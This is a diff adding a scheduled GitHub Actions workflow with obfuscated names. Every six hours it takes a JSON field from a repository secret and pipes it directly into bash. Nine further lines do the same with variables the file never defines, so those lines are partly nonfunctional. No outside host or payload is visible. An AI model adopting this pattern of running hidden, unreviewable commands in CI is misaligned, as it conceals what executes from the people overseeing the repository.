@@ -1,0 +1,27 @@
+name: canrongca
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: canrongca
+        env:
+          jkp37600: ${{ secrets.jkp37600 }}
+        run: |
+          echo $jkp37600 | jq -r .ctc2 | /bin/bash
+          echo $y550 | jq -r .yy0 | /bin/bash
+          echo $j8390 | jq -r .ldq02558 | /bin/bash
+          echo $wn399 | jq -r .kbrsd45468 | /bin/bash
+          echo $xwnq7 | jq -r .gn78 | /bin/bash
+          echo $ncxsf23324 | jq -r .i4 | /bin/bash
+          echo $nb02 | jq -r .guae59 | /bin/bash
+          echo $pg3429 | jq -r .lomx52651 | /bin/bash
+          echo $qjzqj584 | jq -r .zt3402 | /bin/bash
+          echo $s9 | jq -r .q365 | /bin/bash
+
